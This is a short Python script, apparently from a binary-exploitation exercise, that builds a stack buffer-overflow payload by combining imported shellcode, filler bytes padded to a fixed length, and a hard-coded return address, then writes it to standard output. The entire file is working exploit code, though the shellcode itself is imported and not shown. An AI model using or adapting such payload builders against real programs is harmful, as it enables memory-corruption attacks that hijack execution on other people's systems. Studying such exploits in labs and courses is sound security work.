from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(pack("<I", 0x80001000) + shellcode + ('\x12'*(1068-len(shellcode))).encode('ASCII') + pack("<I", 0xbffe6d50))